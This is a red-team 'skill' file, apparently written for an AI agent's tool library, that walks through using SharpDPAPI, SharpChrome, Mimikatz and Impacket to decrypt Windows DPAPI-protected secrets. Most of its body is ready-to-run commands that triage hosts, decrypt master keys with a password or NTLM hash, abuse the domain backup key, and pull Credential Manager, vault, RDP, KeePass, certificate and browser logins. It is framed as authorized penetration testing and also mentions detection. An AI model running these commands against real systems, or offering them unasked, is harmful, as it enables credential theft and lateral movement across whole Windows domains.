---
name: abusing-dpapi-for-credential-access
description: "Use SharpDPAPI/SharpChrome/Mimikatz/dpapi.py to decrypt Windows DPAPI-protected credentials online or offline. Signals: dpapi, credential theft."
zh-signals: "用 SharpDPAPI/SharpChrome/Mimikatz/dpapi.py 在线或离线解密 Windows DPAPI 保护的凭据(凭据管理器、浏览器登录、W信号:dpapi,凭据窃取。"
when-to-use: Extract and decrypt Windows DPAPI-protected secrets (Credential Manager, browser logins/cookies, Wi-Fi credentials, KeePass keys) online or offline using SharpDPAPI, SharpChrome, Mimikatz, or Impacket
domain: cybersecurity
subdomain: red-teaming
tags:
- red-team
- credential-access
- dpapi
- sharpdpapi
- post-exploitation
- active-directory
- windows
- mimikatz
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
mitre_attack:
- T1555.004
---
# Abusing DPAPI for Credential Access

> **Legal Notice:** This skill is for authorized penetration testing, red-team engagements, and educational purposes only. Extracting credentials from systems you do not own or lack explicit written authorization to test is illegal and may violate computer fraud and abuse laws. Always operate within a signed rules-of-engagement and document every action.

## Overview

The Windows Data Protection API (DPAPI) is the operating system's built-in symmetric-encryption service that applications use to protect secrets at rest: saved RDP and Windows Credential Manager credentials, web and Wi-Fi credentials in the Credential Vault, browser saved logins and cookies (Chrome/Edge), KeePass keys, certificate private keys, and Scheduled Task passwords. DPAPI derives a per-user (or per-machine) **master key** from the user's password (or the machine account secret), and that master key encrypts individual "DPAPI blobs." The encrypted master keys live under `%APPDATA%\Microsoft\Protect\<SID>\` (user) and `%WINDIR%\System32\Microsoft\Protect\` (machine).

Red teamers abuse DPAPI to recover plaintext secrets after gaining a foothold, mapping to MITRE ATT&CK **T1555.004 (Credentials from Password Stores: Windows Credential Manager)**. There are three primary decryption paths:

1. **Online / context-based** — running as the target user, DPAPI APIs (`CryptUnprotectData`) transparently decrypt the user's blobs. SharpDPAPI's `/unprotect` flag uses this.
2. **Offline with the user password or NTLM hash** — decrypt the user's master keys with `/password:` or `/ntlm:`, then decrypt the blobs offline (great for triaged files pulled from a host).
3. **Domain-wide with the DPAPI backup key** — Domain Admins can extract the domain's RSA DPAPI backup key (`.pvk`) once, then decrypt *any* domain user's master keys forever, online or offline, with `/pvk:`.

The canonical tooling is **SharpDPAPI** (GhostPack, a C# port of Mimikatz DPAPI functionality) for Windows, **SharpChrome** for browser secrets, and **Mimikatz** (`dpapi::*`) as the original implementation. On Linux, Impacket's `dpapi.py` and `donpapi` perform remote/offline triage.

## When to Use

- After compromising a Windows host where the user has saved RDP, browser, or vault credentials worth harvesting for lateral movement.
- When you hold a user's password or NTLM hash and want to decrypt their DPAPI-protected secrets offline.
- When you have Domain Admin and want to obtain the domain DPAPI backup key to decrypt any user's protected data across the estate.
- When triaging exfiltrated `Credentials`, `Vault`, or `Protect` directories from disk images.
- During purple-team exercises to validate detection of DPAPI master-key access and LSASS/Protect-folder reads.

## Prerequisites

- An authorized foothold (interactive session, beacon, or remote admin) on the target Windows host.
- Knowledge of the target user's SID, and one of: the user's session, password, NTLM hash, or Domain Admin rights for the backup key.
- Tooling (compile from source or use release binaries; obtain only from official upstreams):

```bash
# SharpDPAPI / SharpChrome (GhostPack) — build with Visual Studio / msbuild
git clone https://github.com/GhostPack/SharpDPAPI.git
# Open SharpDPAPI.sln and build Release, or:
msbuild SharpDPAPI.sln /p:Configuration=Release

# Mimikatz (original DPAPI implementation)
# https://github.com/gentilkiwi/mimikatz/releases

# Linux remote/offline triage (Impacket)
pipx install impacket            # provides dpapi.py / impacket-dpapi
pipx install donpapi             # https://github.com/login-securite/DonPAPI
```

## Objectives

- Triage a host for DPAPI-protected credential, vault, RDP, and certificate blobs.
- Decrypt user master keys online (`/unprotect`), with a password/hash, or with the domain backup key.
- Recover plaintext Credential Manager and Vault secrets.
- Extract browser saved logins and cookies with SharpChrome.
- Obtain and reuse the domain DPAPI backup key for estate-wide decryption.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Relevance |
|--------------|------|--------|-----------|
| T1555.004 | Credentials from Password Stores: Windows Credential Manager | Credential Access | DPAPI protects Credential Manager / Vault entries; decrypting master keys and blobs recovers these stored credentials. |
| T1555.003 | Credentials from Password Stores: Credentials from Web Browsers | Credential Access | SharpChrome decrypts DPAPI-protected Chrome/Edge logins, cookies, and state keys. |
| T1003 | OS Credential Dumping | Credential Access | Extracting master keys / backup keys is a form of credential material dumping. |

## Workflow

### 1. Triage the host for DPAPI blobs

Run the SharpDPAPI `triage` command in the user's context to automatically enumerate and (where possible) decrypt credentials, vaults, RDG/RDP, and certificates:

```powershell
# Online triage in the current user's context (uses CryptUnprotectData)
SharpDPAPI.exe triage /unprotect

# Machine triage (requires local admin / SYSTEM) for machine-scoped blobs
SharpDPAPI.exe machinetriage
```

### 2. Decrypt user master keys offline (password or NTLM hash)

If you hold the user's password or hash, decrypt their master keys to a `{GUID}:SHA1` mapping you can reuse against individual blobs:

```powershell
# Decrypt all of the current/specified user's master keys with the password
SharpDPAPI.exe masterkeys /password:CorrectHorseBatteryStaple

# Decrypt master keys with the user's NTLM hash instead of the password
SharpDPAPI.exe masterkeys /ntlm:cc36cf7a8514893efccd332446158b1a

# Output is GUID:SHA1 lines — feed them to credentials/vaults commands
```

### 3. Recover Credential Manager and Vault secrets

Use the decrypted master-key mapping (or `/pvk:`) to decrypt the stored credentials and vault entries:

```powershell
# Decrypt Credential Manager blobs with a GUID:SHA1 mapping
SharpDPAPI.exe credentials {GUID1}:SHA1 {GUID2}:SHA1

# Or point at a target Credentials folder and decrypt with the domain backup key
SharpDPAPI.exe credentials /target:C:\Users\bob\AppData\Local\Microsoft\Credentials\ /pvk:backupkey.pvk

# Decrypt Credential Vault entries
SharpDPAPI.exe vaults /pvk:backupkey.pvk
```

### 4. Decrypt RDP, KeePass, and certificate secrets

```powershell
# Saved RDCMan.settings RDP passwords (current user context)
SharpDPAPI.exe rdg /unprotect

# KeePass DPAPI-protected master keys
SharpDPAPI.exe keepass /unprotect

# Certificate private keys (export usable .pem with /showall for all stores)
SharpDPAPI.exe certificates /unprotect /showall
```

### 5. Extract browser credentials with SharpChrome

SharpChrome decrypts Chrome/Edge logins and cookies. Modern Chromium uses an App-Bound "state key" that SharpChrome resolves via DPAPI:

```powershell
# Decrypt saved logins for the current user
SharpChrome.exe logins /unprotect

> 📎 Detailed content (full examples / references / data tables) has been split into `reference.md` in the same directory; use Read to load the relevant section on demand.
